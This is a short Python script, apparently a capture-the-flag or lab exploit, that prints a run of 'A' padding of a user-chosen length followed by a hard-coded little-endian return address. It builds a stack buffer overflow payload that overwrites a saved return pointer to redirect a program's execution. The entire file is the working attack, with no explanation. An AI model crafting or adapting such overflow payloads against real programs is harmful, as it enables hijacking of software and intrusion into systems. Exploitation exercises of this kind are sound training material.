from sys import argv


length = int(argv[1])

print("A"*length + "\x66\x05\x40\x00\x00\x00\x00\x00", end="")
